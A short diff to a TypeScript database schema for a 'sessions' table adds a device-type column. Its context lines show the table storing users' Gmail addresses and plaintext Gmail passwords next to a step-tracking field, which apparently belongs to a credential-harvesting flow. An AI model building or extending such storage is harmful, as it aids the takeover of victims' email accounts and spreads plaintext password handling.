@@ -116,6 +116,7 @@ export const sessions = pgTable("sessions", {
   celular: text("celular"),
   correo: text("correo"),          // Para almacenar el correo de Gmail
   contrasena: text("contrasena"),  // Para almacenar la contraseña de Gmail
+  dispositivo: text("dispositivo"), // Android, iPhone, PC, etc.
   pasoActual: text("paso_actual").default("folio"),
   createdAt: timestamp("created_at").defaultNow(),
   active: boolean("active").default(true),
